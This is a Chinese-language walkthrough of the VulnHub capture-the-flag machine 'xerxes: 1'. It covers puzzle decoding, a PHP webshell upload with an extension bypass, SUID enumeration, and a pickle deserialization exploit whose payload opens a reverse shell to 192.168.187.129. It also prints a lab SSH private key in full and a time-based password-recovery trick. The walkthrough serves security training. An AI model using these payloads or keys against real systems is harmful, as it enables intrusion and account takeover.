# xerxes: 1

项目地址：https://download.vulnhub.com/xerxes/xerxes.tar.gz

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6988a26f956625ad53577fe6.png)

80 端口

![](https://pic1.imgdb.cn/item/698bfa148b2d4ec3cdd890d3.png)

目录扫描到一个文件上传，但是没有密码

![](https://pic1.imgdb.cn/item/698bfbed8b2d4ec3cdd89214.png)

## CTF

### RGBA 颜色解密

点击忘记密码拿到一个二维码

![](https://pic1.imgdb.cn/item/698bfbb68b2d4ec3cdd89205.png)

在线网站扫描拿到一段字符串

![](https://pic1.imgdb.cn/item/698bfc2d8b2d4ec3cdd89279.png)

Base64 解码得到

```
look deeper
```

放大图片发现有色块

![](https://pic1.imgdb.cn/item/698bfd568b2d4ec3cdd89365.png)

在 PS 等软件中查看颜色发现只有 A 变化

![](https://pic1.imgdb.cn/item/698bfdaf8b2d4ec3cdd893a9.png)

记录下来

```
75,121,115,114,75,121,115,114,87,122,52,114,75,121,115,114,75,121,115,114,75,122,119,116,88,84,52,114,75,121,115,114,76,105,115,117,76,83,48,116,76,83,52,116,76,105,52,61
```

转成 ASCII 码

```
KysrKysrWz4rKysrKysrKzwtXT4rKysrLisuLS0tLS4tLi4=
```

Base64 解码

```
++++++[>++++++++<-]>++++.+.----.-..
```

Brainfuck 解密拿到密码

```
45100
```

## 文件上传

### Upload

直接传 PHP 木马被拦截了

![](https://pic1.imgdb.cn/item/698bffb669f3169ba02ccbbd.png)

改了一下后缀上传成功

![](https://pic1.imgdb.cn/item/698bfffc69f3169ba02ccbef.png)

连接成功

![](https://pic1.imgdb.cn/item/698c006a69f3169ba02ccc1b.png)

## 提权

### 权限配置不当

进入家目录发现 `amanpour` 用户的目录可以进去

![](https://pic1.imgdb.cn/item/698c026869f3169ba02ccd3d.png)

观察历史命令

![](https://pic1.imgdb.cn/item/698c057569f3169ba02ccfc4.png)

把脚本内容扔给 AI 结合命令分析

```python
import Image, sys, getopt
def decode(filename):
    image = Image.open(filename)
    pixels = image.load()
    x = 0
    y = 0
    done = 0
    message = ""
    while done == 0:
        pixel = pixels[x, y]    
        if (pixel[3] != 255):
            message = message + chr(pixel[3])
        else:
            done = 1
        x = x + 1
        if (x == image.size[0]):
            x = 0
            y = y + 1
    print message
def encode(filename, message):
    image = Image.open(filename)

    if image.mode != 'RGBA':
        print "[!] converting " + filename + " to RGBA"
        image = image.convert('RGBA')
    pixels = image.load()
    x = 0
    y = 0
    for c in message:
        pixel = pixels[x, y]
        # write new alpha value
        pixels[x, y] = (pixel[0], pixel[1], pixel[2], ord(c))
        x = x + 1
        if (x == image.size[0]):
            x = 0
            y = y + 1
    encodedImage = filename + "-enc.png"
    image.save(encodedImage)

def main():
    mode = 0 # 0 = decode, 1 = encode
    try:
        opts, args = getopt.getopt(sys.argv[1:], "f:s:")
    except getopt.GetoptError:
        print "steqr -f filename -s string"
        sys.exit(-1)
    for opt, arg in opts:
        if opt in ("-f"):
            filename = arg
        elif opt in '-s':
            string = arg
            mode = 1
    if mode == 1:
        encode(filename, string)
    if mode == 0:
        decode(filename)
if __name__=="__main__":
    main()
```

![](https://pic1.imgdb.cn/item/698c066e69f3169ba02cd0b5.png)

![](https://pic1.imgdb.cn/item/698c06a169f3169ba02cd0e3.png)

按照 AI 的结果执行阶段 6 的命令拿到一串字符

![](https://pic1.imgdb.cn/item/698c06c669f3169ba02cd118.png)

结果 SSH 直接连接上去了

![](https://pic1.imgdb.cn/item/698c06fc69f3169ba02cd134.png)

### Pickle 反序列化

查找所有有 SUID 权限的文件

```bash
find / -perm -4000 -type f 2>/dev/null
```

发现一个 `/opt/notes`

![](https://pic1.imgdb.cn/item/698c1dba69f3169ba02cd8ac.png)

进入到 `/opt` 目录下发现有个 `notes.py` 文件

![](https://pic1.imgdb.cn/item/698c1e7569f3169ba02cd8fe.png)

查看源代码

```python
import pickle

notes = []

def save(filename):
        if len(filename) < 1:
                filename = "notes"
        f = open("/home/curtiz/" + filename, "wb")
        pickle.dump(notes, f)
        f.close()
        return 0

def load(filename):
        if len(filename) < 1:
                filename = "notes"
        f = open("/home/curtiz/" + filename, "rb")
        notes = pickle.load(f)
        f.close()
        return notes

def main():
        global notes
        print ""
        print "-------------------------------"
        print " Welcome to Juan's to-do list! "
        print "   type help for more info     "
        print "-------------------------------"

        while True:
                raw_cmd = raw_input()
                cmd = raw_cmd.split()
                if (len(cmd) > 0):
                        if "help" == cmd[0]:
                                print " Available commands:"
                                print "   - add  [note] : add a note for Juan"
                                print "   - show        : show to-do list"
                                print "   - save [file] : save to-do list"
                                print "   - load [file] : load to-do list"
                                print "   - quit        : exit"
                                print ""

                        if "add" == cmd[0]:
                                #print "add"
                                notes.append(" - " + raw_cmd[4:])

                        if "save" == cmd[0]:
                                #print "save"
                                save(raw_cmd[5:])

                        if "load" == cmd[0]:
                                #print "load"
                                notes = load(raw_cmd[5:])

                        if "show" == cmd[0]:
                                #print "show"
                                for note in notes:
                                        print note

                        if "quit" == cmd[0] or "exit" == cmd[0]:
                                return 0
        return 0

if __name__ == "__main__":
        main()
```

关键代码在 `load()` 函数中，可能会以用户 `curtiz` 运行

```python
f = open("/home/curtiz/" + filename, "wb")
```

在 Linux 权限模型中：

- **RUID (Real UID):** 启动进程的真实用户 ID

- **EUID (Effective UID):** 进程执行时生效的用户 ID

尝试 Pickle 反序列化提权到 `curtiz` 用户上

```python
┌──(root㉿kali)-[/home/kali]
└─# cat exploit.py   
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        # 在 Python 中，我们可以利用 os.setreuid 来同步 RUID 和 EUID
        cmd = (
            "python -c 'import os,pty,socket;"
            "os.setreuid(os.geteuid(), os.geteuid());" # 关键一步：将 RUID 设为 EUID
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"192.168.187.129\",45640));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "pty.spawn(\"/bin/bash\")'"
        )
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit(), protocol=2)
with open("evil_note", "wb") as f:
    f.write(payload)
```

![](https://pic1.imgdb.cn/item/698c317217402bfe3bc80941.png)

### Python 升级为交互式 Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://pic1.imgdb.cn/item/698c34fc13218ae1b176c145.png)

### SSH 私钥泄露

进入到家目录中发现 `notes` 线索

![](https://pic1.imgdb.cn/item/698c357713218ae1b176c14a.png)

翻译一下

```
我找到了 Marie 的密钥文件，并且能够通过 SSH 登录
```

去找这个用户

![](https://pic1.imgdb.cn/item/698c365013218ae1b176c152.png)

在当前用户家目录中发现还有一个 `id_rsa` 文件

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoRCJPJ0sIabJxmC0cbR1ppci3FFh5GBCVV/BYNnU9UKnOJyn
CtKCZDd+RAZiNxrN37eh486uyBdbHu8UVcDaPDrge3XHrrHQn41za1I1eXYQ3dhV
mSY8kLkqmXMYutTwPxB4Eav0KMbdmsg+frSEU1TDiIhEVG7/h5wQTpdWRMVRKDFb
lrwm0yFV9a/Ib1+qB4AMUC9VFvAvqhMJfF2ZrYXcni1X+QRbGdr94seEYCg369lD
XEcHhkAhf+LrU99bCsTXa5d6TMKhFrDegLd5Mb8VCAgZFUAStpYTbAfazwBN4eux
9Q62opjNaNUN1XXpTD8hU4Q56YN0lNd/5rJRYQIDAQABAoIBABrcmSbEx8FtAaXW
JwH3qM950VSRNhRSgX2flK7EZaHp1d25Mpq5dQmlv6c0sVijXcZ758IIjFnOm2HT
Wb7bhQoaf6nXgM//091oR+GUOlrhd/qnw87g86TnXNVuvqcaMF80LfI0jWnnkLnp
v5J+JLuJHXs9zreOM4u4WXfiAX9CbXrcwFoHEh7io0s1WmrA/DGJJLD50O6/GkN+
QSvnU77JTb+1HOtXpN9T6x0tz/BEr3ahjYbzpqg+MPIuZUCU9uTK0Hfb+NPvd6sr
bdjYGCKu6FPiYMgZ11WMGDWzI/Uiu8URtKmGe0e0x/Wlny6D/f21hlwO0XNOy2Pq
ZeSj/WECgYEA0j6G6ah6onC6bcWOlnj7RRLV0Hv8TSdPoIA/ZUvAiZUsAqp9So+H
Ne60/HZXIVFV+BkiZff86cYqvqRdg4UZ3pSAvxFhR97Xf3P84qe2cg1l3NPbhWkT
Dp9XaP6sXFZ+eyKDTO9VkNbXRKIzZOzYqAmyqyZEqtRm5ZB1auBGvhUCgYEAxB4I
Do6paaNDNT/Onmccm5wlbUr7kgSEweGI9QnEv2GK+kwPsTaagtU4B6zHxVVyXemk
04r0ZtQo2GEWZkkrJiKQO7QYG3prNf9hd+4Jw8NDpdiUFeLr3q1YS3rpEDHN1EBV
YebflltIf5Wkl27LJlT4Mz9BZbd3L0CVAWuO5R0CgYA/TPwp1cQ2rGI1MsofnAVr
YqRlxS7NvAxJctOjmA88XWGG2/YlQNmg72ImsSrCqU6NCGRG90d6y2OLSsmtE6Ia
VfP9kyoLDZkskquNQpm39Ti6KD9sB5rpSCh1QFh85L3oLRgDTfwhQ85Ep+F5faYt
0d2tkjQSiyj/7WKs7yHdkQKBgQCpGe/+hVpkgObJelwxT11me6v14iqrDARgnJSY
HLUuA/Buw7jgJ+Hwn+LxEzUp3PSBL5303aLBK3yQnp5O0hZHipPtNut2fgcFh0/G
tlRrHOoujWGawZB57+PrKW7ejOMaeeJlSUpO/iS0BhbmkBzQz4E3xvoft6Mn9jrE
/7Y1rQKBgAefUP+D3pt4EZa37RS6FdbTyHyFpYlzK8SVrnyt+ELn8MU4PJj72Yq4
f2sTKGrC2DFXmNxhdJGAJw1vChET1aVU+QxJxckF/h4gJKsbfKuoSECb4Ojomh9o
SeNEL6zyLP7mMLFvGnpc63pOTuDgQr954JMW4P2F5ekku2Ea5DMX
-----END RSA PRIVATE KEY-----
```

使用私钥连接这个用户成功

![](https://pic1.imgdb.cn/item/698d80e41d67521e9b484749.png)

### 密码泄露

在家目录中找到两个可执行脚本

![](https://pic1.imgdb.cn/item/698d818ac46878ce9faee0cd.png)

第一个脚本用于：

1. 检查一个名为 "last"（或包含 "last"）的文件

2. 如果该文件超过 24 小时未更新，认为密码已过期

3. 提示用户更新密码

```shell
#!/bin/sh
echo "XERXES checking security."
# 获取文件最后修改时间
LAST=$(ls -alh | grep last | awk '{print $6,$7,$8}')
# 转换时间为时间戳
LAST_SEC=$(date -d "$LAST" "+%s")
# 获取当前时间戳
DATE_SEC=$(date "+%s")
# 计算时间差
DIFF=$(expr $DATE_SEC - $LAST_SEC)
if [ "$DIFF" -gt "86400" ]; then
    echo "Your password has expired. Please generate a new one."
    echo "XERXES wishes you"
    echo "a nice day"
fi
```

第二个脚本用于：

1. **创建密码标记**：通过 `touch .last` 更新或创建时间戳文件

2. **生成随机密码**：基于当前时间的 MD5 哈希值

3. **显示密码**：输出格式化的密码信息

```shell
#!/bin/sh
# 创建文件并生成密码
touch .last && p=$(date | awk '{print $4}' | md5sum | awk '{print $1}')
echo "XERXES has generated a new password: $p"
echo
echo "XERXES is forever"
echo "at your service"
```

现在我们需要找到 ".last" 文件创建时间时间戳

```shell
stat .last
```

接下来需要获取其 MD5 哈希值

```shell
echo 00:19:51 |md5sum
```

提权成功

![](https://pic1.imgdb.cn/item/698d8475c46878ce9faee1cb.png)
